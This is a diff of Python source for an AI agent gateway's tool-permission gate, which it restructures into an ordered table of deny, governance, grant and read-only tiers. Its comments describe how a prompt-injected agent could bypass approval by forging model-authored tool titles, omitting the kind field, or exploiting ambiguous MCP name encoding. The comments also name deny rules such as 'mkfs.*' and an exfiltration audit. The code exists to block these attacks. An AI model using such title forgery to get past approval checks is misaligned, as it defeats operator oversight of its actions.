-        # carries: kiro-cli sets ``_meta.kiro.toolName`` for every tool call but
-        # ``mcpServerName`` only for MCP-served ones, so the canonical form above
-        # is empty for a built-in and its real name would otherwise reach no check
-        # at all -- leaving ``deny = ["fs_write"]`` bypassable behind a benign
-        # model-authored title. Appended whenever present, MCP or not, because a
-        # deny target can only ever DENY: an identity the model could influence
-        # cannot waive a rule here, at most it matches one it did not need to.
-        if mcp_tool_name and mcp_tool_name not in deny_targets:
-            deny_targets.append(mcp_tool_name)
-        # What the GOVERNANCE plane is asked about, which is NOT the same string,
-        # because that plane has a SERVER level the deny plane does not and it
-        # matches canonical references rather than raw titles.
-        #
-        # The ``mcp__<server>__<tool>`` title is a LOSSY encoding: the parser that
-        # reads it splits on the LAST ``__``, so it can carry any server name but
-        # never a tool name containing ``__``. ``@github`` + ``repo__delete``
-        # encodes to ``mcp__github__repo__delete`` and reads back as server
-        # ``github__repo`` with tool ``delete``, so a ``deny @github/repo__delete``
-        # ceiling never binds and a human is asked to approve a tool the policy
-        # forbids. No spelling of that title fixes it -- the ambiguity is in the
-        # format -- so the trusted fields are composed straight into the canonical
-        # ``@server/tool`` form the matcher documents, where ``/`` separates and
-        # neither segment can contain it. A server with no proven tool asks the
-        # server-level question ``@server``, which a ``@server`` rule matches and
-        # a ``@server/tool`` rule correctly does not.
-        #
-        # Deliberately NOT added to ``deny_targets``: that plane matches raw text
-        # and operator regexes, where a canonical reference is a DIFFERENT string
-        # from the raw identity a rule is written against rather than a broader
-        # form of it, and feeding it there would widen matching by accident
-        # instead of by grammar.
-        governance_mcp_ref = mcp_identity_ref(mcp_server_name, mcp_tool_name)
-        if command:
-            deny_targets.append(command)
-        for _raw_command in raw_shell_commands:
-            # Already past the scan ceiling above; see ``raw_shell_commands``.
-            if _raw_command not in deny_targets:
-                deny_targets.append(_raw_command)
-        for target in deny_targets:
-            reason = authority.is_denied(
-                target,
-                self._config.auto_deny_tools,
-                denied_regexes=denied_regexes,
-                reason_notes=denied_notes,
-            )
-            if reason:
-                return ToolHookResult.deny(reason)
-        # The user's own ``auto_deny_tools`` GLOBS, and only those, are also
-        # matched against the identity in the ``@server/tool`` spelling the
-        # approve loop below uses (plus ``Running: @server/tool`` and the bare
-        # ``@server``, so a server-level rule binds to every tool). A user who
-        # writes both lists in one spelling -- ``auto_approve_tools:
-        # ["@ops/*"]``, ``auto_deny_tools: ["@ops/delete_*"]`` -- otherwise gets
-        # an approve keyed on the verified identity while the deny rides the
-        # forgeable title, and a benign title over a denied tool auto-fires.
-        # Kept OUT of ``deny_targets`` above on purpose: the shipped regex rules
-        # are authored against shell text, and running them over a synthesized
-        # reference is the accidental widening the note above forbids. Not
-        # gated on provenance: a deny can only ever deny.
-        if mcp_server_name and self._config.auto_deny_tools:
-            _tool_ref = mcp_identity_ref(mcp_server_name, mcp_tool_name)
-            for _ref in (_tool_ref, f"Running: {_tool_ref}", mcp_identity_ref(mcp_server_name, "")):
-                if _ref and any(
-                    _tool_matches(pattern, _ref) for pattern in self._config.auto_deny_tools
-                ):
-                    return ToolHookResult.deny(f"Blocked by security policy: {_ref}")
-
-        # A file-search builtin's scope lives only in its arguments -- it carries no
-        # ``command``, and its title need not name the root it walks -- so this target is
-        # the only form in which a deny rule can see a whole-tree walk.
-        #
-        # It is evaluated in its OWN tier, not appended to the loop above, because it is
-        # not a command line: run through the shared rule set it collides with the
-        # command-oriented built-ins on argument text (the ``mkfs.*`` rule denying a
-        # read-only search of a directory named ``mkfs-tests``), and the only per-rule
-        # remedy -- disabling that rule by id -- also stops it protecting real shell
-        # commands.
-        #
-        # The patterns that PARTICIPATE are passed explicitly: the operator's own enabled
-        # regexes, never the merged effective set.  That is what makes provenance
-        # structural rather than inferred -- classifying the merged set by pattern TEXT
-        # cannot tell an operator's rule from a shipped one when the text coincides
-        # (``mkfs.*`` is a natural thing to type), and reading the operator's own rule as
-        # shipped would silently drop an explicit deny.  The shipped catalogue takes no
-        # part here at all: none of its rules is authored against the synthesized grammar
-        # (ratcheted in the tests), so a built-in's only possible hit is the incidental
-        # one this tier exists to drop.
-        search_target = _search_deny_target(raw_params)
-        if search_target:
-            reason = authority.is_denied_synthesized_target(
-                search_target,
-                [p.pattern for p in self._config.denied_commands_user_added if p.enabled],
-                extra_patterns=self._config.auto_deny_tools,
-                reason_notes=denied_notes,
-            )
-            if reason:
-                return ToolHookResult.deny(reason)
-
-        # Governance ceiling ∩ active profile (Level 1 ∩ Level 2).  Runs BEFORE
-        # the auto-approve loop so a governance deny wins over a user
-        # auto-approve and is never bypassed.  This is the layer that denies a
-        # tool/MCP call even when the kiro agent config granted it, by name,
-        # regardless of kiro's allowedTools.  No-op on a standalone host with no
-        # policy and no bound profile (gate_decision permits), so today's
-        # behavior is preserved unless governance is configured.
-        #
-        # Governed under BOTH identities for the reason spelled out at
-        # ``canonical_mcp_name``: a ceiling/profile rule naming the real MCP tool
-        # must bind even when the title is model-authored prose, and a rule
-        # naming the title must still bind. Tightest-wins, so evaluating both and
-        # denying on either preserves the governance contract. The MCP identity
-        # is ``governance_mcp_name``, which falls back to the server alone when
-        # that is all the backend proved.
-        # Governance is asked about the display title AND, separately, the trusted
-        # MCP identity. The identity travels as a canonical reference rather than a
-        # title because the title grammar cannot round-trip every name (see
-        # ``mcp_identity_ref``); a deny on either is final. An absent identity
-        # (a non-MCP call) is not asked about at all -- an empty title classifies
-        # to the unprefixed scopes, where it is a queryable item rather than a
-        # no-op, so querying it could deny on a rule it has nothing to do with.
-        # ONE query, every identity. The title, the trusted tool name and the MCP
-        # reference are all asked against a SINGLE resolved profile: asking them
-        # as separate calls re-resolved the active profile each time, so a profile
-        # hot-reloaded mid-call could answer each question from a different
-        # snapshot and permit a tool that both complete profiles deny -- and each
-        # extra call walked ``profiles/`` synchronously on the event loop.
-        # Tightest-wins is preserved: a deny on any identity denies the call.
-        gov_reason = _governance_denial(
-            ctx,
-            tool_name,
-            session_key,
-            agent,
-            app,
-            tool_kind,
-            raw_params,
-            diff_path=diff_path,
-            mcp_ref=governance_mcp_ref,
-            extra_titles=(mcp_tool_name,) if mcp_tool_name and mcp_tool_name != tool_name else (),
-            spawn_target=spawn_target,
-        )
-        if gov_reason:
-            return ToolHookResult.deny_policy(gov_reason)
-
-        # App-own MCP server auto-approve — a FIRST-PARTY (builtin) app agent
-        # calling its OWN app-scoped MCP server is intra-app, not a host surface.
-        # A builtin app's declared server is registered under the
-        # ``<app>:<server>`` key (see ``apps/bridges.py``) and IS the gateway's
-        # own shipped code, so it only touches the app's own data — never
-        # fs/network/exec/exfil on the host. Once a shipped app agent stopped
-        # pre-authorizing tools (no template ``allowedTools``, the "no template
-        # pre-authorizes tools" invariant), even those intra-app calls fell
-        # through to an interactive prompt the user could not meaningfully act on
-        # (the app was blocked from talking to itself). Auto-approving them here
-        # restores that UX without re-widening any host grant.
-        #
-        # Keyed on the NON-model-authored ``mcp_server_name`` (the ACP
-        # ``_meta.kiro.mcpServerName``), NEVER on the LLM-authored title: a
-        # prompt-injected agent can title a Bash call ``mcp__<app>:srv__x``, but
-        # kiro-cli only sets ``mcp_server_name`` for a genuine MCP-served call, so
-        # a forged shell/host title carries an empty server name and never
-        # matches (fail-closed). Restricted to builtins on purpose: only a
-        # builtin's server is provably first-party. A THIRD-PARTY app's server is
-        # arbitrary installed code whose internals the gate cannot see, so its
-        # own-server calls are NOT auto-approved here — the OS sandbox it runs
-        # under and the third-party admission gate bound its behavior instead.
-        #
-        # Placed AFTER the always-on deny floor and ``_governance_denial`` so a
-        # ceiling/profile can still deny even a builtin's own server and every
-        # sensitive-path / keystone / exfil deny above still wins; and BEFORE the
-        # interactive fall-through, independent of the Normal/Read/Trust tier
-        # (that tier governs the HOST tools an app agent may reach, not the app
-        # talking to its own server). Generic App Kit contract keyed only on the
-        # ``<app>:<server>`` convention + shipped-manifest provenance — no per-app
-        # special-casing.
-        #
-        # ``_app_owns_mcp_server`` only proves the NAME is ``<app>:``-prefixed;
-        # ``_own_mcp_servers`` (bridges.py) injects app servers into the agent by
-        # reading that prefix from the MUTABLE global MCP config, so a
-        # ``<app>:evil`` entry that landed there (not declared by the app) would
-        # otherwise be trusted. Require the server to be DECLARED in the app's
-        # SHIPPED manifest (``_is_declared_builtin_mcp_server``, an in-memory set
-        # warmed at boot from immutable manifests — same discipline as
-        # ``_BUILTIN_APP_NAMES``) so only a genuinely app-own server auto-approves.
-        #
-        # Recover an app identity for a builtin whose slot carries NONE. Only a
-        # request with an authenticated app scope sets ``Slot._app``, so a
-        # builtin whose UI is not an app iframe (an Electron window using the
-        # dashboard session cookie) binds its slot with an empty app and every
-        # condition below keyed on it fails — the app could not talk to its own
-        # server. Prefer the slot's own ``app`` whenever it HAS one, so an
-        # app-scoped session behaves exactly as before; the derived value is used
-        # ONLY for this auto-approve and is never written back to the slot (see
-        # ``_builtin_app_for_agent`` — ``_app`` also drives app isolation).
-        #
-        # Keyed on ``resolved_agent`` (what ACTUALLY ran), NEVER on ``agent``:
-        # the latter is the slot's ALIAS, which ``resolve_agent_bindings`` maps to
-        # a concrete kiro agent before dispatch, so a user-defined alias named
-        # after a builtin's agent could otherwise borrow that app's identity for
-        # a completely different runtime agent. An empty ``resolved_agent`` (an
-        # uncached permission event, or a caller that does not thread it through)
-        # yields no identity — fail-closed to interactive approval.
-        #
-        # The two GRANT tiers — this app-own-server rule and the operator's
-        # ``auto_approve_tools`` globs below — vouch for the CALLER and say
-        # nothing about what the call does. ``classifier_only`` skips exactly
-        # these two, so the read-only classifier further down judges the call
-        # on its own merits (a grant that shadows a read costs nothing, a grant
-        # that shadows a write approves nothing). Every deny tier and governance
-        # ran above regardless of the flag.
-        owner_app = app or _builtin_app_for_agent(resolved_agent)
-        if (
-            not classifier_only
-            and _app_owns_mcp_server(mcp_server_name, owner_app)
-            and _is_first_party_app(owner_app)
-            and _is_declared_builtin_mcp_server(mcp_server_name)
-        ):
-            # The deny floor has already run against ``canonical_mcp_name`` and
-            # governance against ``governance_mcp_name`` on the common path above,
-            # so a ceiling or profile denying ONE tool of this server — or the
-            # server as a whole — has returned a deny and cannot reach this
-            # auto-approve. Those checks live there only, so there is one copy to
-            # keep in step rather than two.
-            #
-            # The identity requirement is what this branch enforces: a missing
-            # trusted tool name (a backend without ``_meta.kiro.toolName``, or an
-            # uncached permission event) leaves ``canonical_mcp_name`` empty,
-            # which means WHICH tool this is cannot be proven — and an
-            # unidentifiable tool must not be auto-approved on the strength of its
-            # server alone. Fall through to interactive approval (fail-closed),
-            # never silent execute.
-            if canonical_mcp_name:
-                return ToolHookResult.auto_approve(identity_grant=mcp_identity_trusted)
-
-        # Auto-approve — match against both the original title (preserves
-        # "Running: "/"Reading " prefixes) and the normalized name (stripped)
-        # so that "Running: *" and bare tool-name patterns both work.
-        #
-        # This loop matches the TITLE, which the agent authors — safe here
-        # ONLY because a shell call whose command could not be recovered was
-        # already hard-denied above, so no unverified command can reach it. Do not
-        # weaken that refusal without also gating this loop.
-        #
-        # For an MCP-served call whose canonical identity is VERIFIED — both
-        # ``_meta.kiro`` fields present AND the caller's ``mcp_identity_trusted``
-        # provenance flag set (the event's own flag, earned only when the
-        # identity came from the client's tool_call cache; non-emptiness alone
-        # is not provenance, see ``AcpEvent.mcp_identity_trusted``) — the
-        # pattern is matched against THAT identity, in place of the title. A
-        # grant keyed on the title would let a model-authored ``description``
-        # that reads like an allowed tool approve a different one; keyed on the
-        # identity, the pattern approves exactly the tool that executes. Two
-        # spellings of the same identity: kiro-cli's own title form
-        # ``Running: @server/tool`` and the governance reference
-        # ``@server/tool`` (``mcp_identity_ref``). The wire form
-        # ``mcp__server__tool`` is deliberately NOT a grant target: a server
-        # or tool name may itself contain ``__``, so two different verified
-        # identities can share one wire spelling, and a grant written against
-        # it would approve the other tool. The deny list may accept that form
-        # (over-denying is safe); a grant may not. An identity that is present
-        # but unproven falls back to the title branch, exactly as before.
-        #
-        # The whole loop is a GRANT tier, so ``classifier_only`` skips it
-        # (see the app-own-server rule above for why).
-        if not classifier_only:
-            _identity_ref = (
-                mcp_identity_ref(mcp_server_name, mcp_tool_name)
-                if mcp_server_name and mcp_tool_name and mcp_identity_trusted
-                else ""
-            )
-            grant_targets: tuple[str, ...]
-            if _identity_ref:
-                grant_targets = (f"Running: {_identity_ref}", _identity_ref)
-                identity_grant = True
-            else:
-                grant_targets = (tool_name, normalized)
-                identity_grant = False
-            for pattern in self._config.auto_approve_tools:
-                if any(_tool_matches(pattern, target) for target in grant_targets):
-                    return ToolHookResult.auto_approve(identity_grant=identity_grant)
-            if _identity_ref:
-                # Runtime breadcrumb for the deliberate title-match exclusion: a
-                # pattern that matches the agent-authored title does not grant an
-                # identity-verified MCP call. On an unattended surface the only
-                # other symptom is a card nobody answers, so say once per
-                # (pattern, identity) which rewrite restores the grant.
-                for pattern in self._config.auto_approve_tools:
-                    if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
-                        _note_title_only_grant_pattern(pattern, _identity_ref)
-
-        # KiroCrew-side read-only auto-approve — the LAST branch before allow(),
-        # AFTER every early-return deny (deny-by-default shell, sensitive-path,
-        # sensitive-bash, exfil, write-protected-config, the effective deny set,
-        # and governance). Its position guarantees a read-only classification can
-        # never re-admit anything the gates above blocked. This re-homes the
-        # "reads don't nag" UX now that kiro-cli's autoAllowReadonly is retired.
-        # The slack.gateway import below is function-local: slack.gateway imports
-        # hooks at module top, so a top-level import here would create a boot
-        # import cycle. The bash classifier lives on the security surface, which
-        # this module already imports at top, so it needs no such dodge.
-        # Every auto-approve below carries ``read_only=True``: a verdict about the
-        # call's EFFECT, and the only auto-approve READ_ONLY honours. The grant
-        # tiers above stay untagged.
-        if is_shell:
-            # A shell read-only classification uses the deny-by-default bash
-            # classifier (rejects redirects/substitution/backgrounding). When the
-            # command could not be recovered we already denied above; a present
-            # command that is not read-only falls through to interactive approval.
-            if command and is_read_only_bash(command):
-                return ToolHookResult.auto_approve(read_only=True)
-        else:
-            from kiro_crew.slack.gateway import _is_read_only_tool
-
-            kind = (tool_kind or "").strip().lower()
-            if classifier_only:
-                # READ_ONLY has no approver behind it, so a read-only verdict
-                # here EXECUTES the call unattended. Under this flag the proof
-                # must come from HOST-TRUSTED facts alone. The shell branch
-                # above already judges the recovered command; this branch
-                # accepts only a built-in the host knows to be read-only,
-                # identified by the non-model-authored ``_meta.kiro.toolName``
-                # (``mcp_tool_name``) with no MCP server behind it, and ONLY
-                # when ``mcp_identity_trusted`` says that pair came from the
-                # provenance-verified caches rather than an inline payload or
-                # a hand-built event — the absence of a server name proves
-                # nothing until the pair itself is proven host-stamped. The two
-                # agent-influenced inputs that reach this point prove nothing:
-                # ``kind`` is the ACP ``kind`` field passed through verbatim
-                # (the interactive path below keeps its existing kind
-                # allow-list, unchanged), and the title is model-authored
-                # prose. Both may NARROW — a non-read kind refuses even a
-                # host-known read tool, so the two must agree — never widen.
-                # An MCP-served tool carries no host-trusted read-only marker
-                # on the permission event (``readOnlyHint`` is a manifest claim
-                # nothing forwards to the gate), so it is not provable here and
-                # falls to the caller's path, which under READ_ONLY refuses.
-                if kind and kind not in _READ_ONLY_TOOL_KINDS:
-                    return ToolHookResult.allow()
-                if _is_host_read_only_builtin(
-                    mcp_tool_name, mcp_server_name, mcp_identity_trusted=mcp_identity_trusted
-                ):
-                    return ToolHookResult.auto_approve(read_only=True)
-                return ToolHookResult.allow()
-            # Trust the SEMANTIC kind, as an ALLOW-list. `tool_kind` is passed
-            # through verbatim from the ACP `kind` field (``acp/_dispatch.py``), so it
-            # is an arbitrary agent-influenced string and a DENYLIST of mutating kinds
-            # can never be complete — `kind="other"` is a real ACP value. Only these
-            # two spellings mean "this cannot change anything".
-            if kind in _READ_ONLY_TOOL_KINDS:
-                return ToolHookResult.auto_approve(read_only=True)
-            # Computer-use observation tools ("reads don't nag" for this feature too),
-            # and they require an EXPLICIT read-only kind — reached only under the
-            # branch above. Two agent-controlled inputs meet here and neither may
-            # decide alone:
-            #
-            #   * `tool_name` comes from `select_tool_title`, which prefers the
-            #     LLM-authored `description`, so a mutating call can title itself
-            #     `…__computer_get_state`;
-            #   * an omitted `kind` is indistinguishable from an honest one.
-            #
-            # Keying the class lookup on the title alone therefore let a `computer_click`
-            # forge an observation title, omit its kind, and skip the approval prompt
-            # entirely once the operator enabled computer use — the prompt that is the
-            # last thing between an injected agent and a real click on the operator's
-            # desktop. Demanding the kind means the two inputs must AGREE.
-            #
-            # The class table is still consulted (never `_is_read_only_tool`, whose
-            # leading-verb heuristic would auto-approve every `computer_*` tool or none
-            # depending on the name), and it is still gated on the keystone primary
-            # enable so no auto-approval can exist while the feature is off. Reached
-            # only AFTER the deny floor and `_governance_denial`, so a governance deny
-            # still wins. There is deliberately no approval-floor clamp to mention: the
-            # `computer_use.approval` ordinal was removed with the rest of that model.
-            if kind in _READ_ONLY_TOOL_KINDS and _cu_read_only_auto_approve(tool_name):
-                return ToolHookResult.auto_approve(read_only=True)
-            # Any other non-empty kind falls through to interactive approval, whatever
-            # the call titles itself. Over-blocking costs one prompt; under-blocking
-            # costs the prompt.
-            if kind:
-                return ToolHookResult.allow()
-            # Kind ABSENT: the pre-existing generic fallback, unchanged. It is safe for
-            # computer use specifically because `_is_read_only_tool` matches on a
-            # leading read-ish verb and rejects EVERY `mcp__kirocrew-computer__*` title
-            # (verified) — so a forged computer-use title cannot reach an auto-approve
-            # through this path either.
-            if _is_read_only_tool(tool_name):
-                return ToolHookResult.auto_approve(read_only=True)
-
-        return ToolHookResult.allow()
 
     def _effective_denied(self, ctx: object) -> list[str]:
         """Resolve the effective regex-tier denied set for this call.
@@ -3323,6 +2701,7 @@ _hook_runtime.compose(
     (
         _owner_denied_commands,
         _owner_descriptor_identity,
+        _owner_gate_tiers,
         _owner_governance_gate,
         _owner_hook_dispatch,
         _owner_internal_reads,
@@ -3334,4 +2713,60 @@ _hook_runtime.compose(
         _owner_tool_identity,
         _owner_windows_paths,
     ),
+)
+
+
+# The tool gate, row by row, in the order ``HookManager.judge`` runs it. Built after
+# ``compose`` so each row holds the rebound tier function, which reads this module's
+# globals -- built before it, a row would keep the owner's original, and a patch of
+# ``hooks.<name>`` would not reach the tier. The kinds are monotone (every deny before
+# every grant, the classifier last). What each tier checks is documented on its body
+# in :mod:`kiro_crew.hook_runtime.gate_tiers`.
+GATE_TIERS: tuple[GateTier, ...] = (
+    GateTier("unverifiable-shell", "deny", _tier_unverifiable_shell),
+    GateTier(
+        "targets",
+        "deny",
+        _tier_targets,
+        rules=(
+            GateRule("sensitive-path", _rule_sensitive_path),
+            GateRule("sensitive-bash", _rule_sensitive_bash, "is_sensitive_bash_command"),
+            GateRule("exfil", _rule_exfil, "audit_bash_exfiltration"),
+        ),
+    ),
+    GateTier("param-paths", "deny", _tier_param_paths),
+    GateTier("write-protected", "deny", _tier_write_protected),
+    GateTier("deny-rules", "deny", _tier_deny_rules, "is_denied"),
+    GateTier("mcp-auto-deny", "deny", _tier_mcp_auto_deny),
+    GateTier("search-target", "deny", _tier_search_target),
+    GateTier("governance", "deny_policy", _tier_governance),
+    GateTier("app-own-server", "grant", _tier_app_own_server),
+    GateTier("operator-grants", "grant", _tier_operator_grants),
+    GateTier("read-only", "classify", _tier_read_only),
+)
+
+#: Why ``GATE_TIERS`` is not a sound gate table (``gate_tier_problems``), checked once
+#: as this module loads; empty for the shipped table. A problem is not RAISED here: an
+#: import-time refusal fails every test at collection, the one that names the problem
+#: included. ``HookManager.judge`` refuses every call instead (fail closed), and
+#: ``test/test_gate_tiers.py`` names the problem.
+_GATE_TABLE_PROBLEMS: tuple[str, ...] = tuple(gate_tier_problems(GATE_TIERS))
+if _GATE_TABLE_PROBLEMS:
+    logger.error(
+        "hooks.GATE_TIERS is not a sound gate table, so every tool call is refused: %s",
+        "; ".join(_GATE_TABLE_PROBLEMS),
+    )
+
+# The checks of ``GATE_TIERS`` that judge a shell command line, as (tier name,
+# ``kiro_crew.security`` attribute), in table order: ``shell_rules(GATE_TIERS)``
+# written out. A LITERAL on purpose -- ``scripts/deny_diff.py`` reads it from this
+# file with ``ast.literal_eval``, because the denial differential's parent process
+# never imports the product it compares. No path rule: the gate reads a PATH there
+# and a shell command is command text, which the gate deliberately does not match
+# paths in (the OS sandbox holds the credential stores away from the shell).
+# ``test/test_gate_tiers.py`` pins it equal to the projection.
+SHELL_DENY_TIERS: tuple[tuple[str, str], ...] = (
+    ("sensitive-bash", "is_sensitive_bash_command"),
+    ("exfil", "audit_bash_exfiltration"),
+    ("deny-rules", "is_denied"),
 )
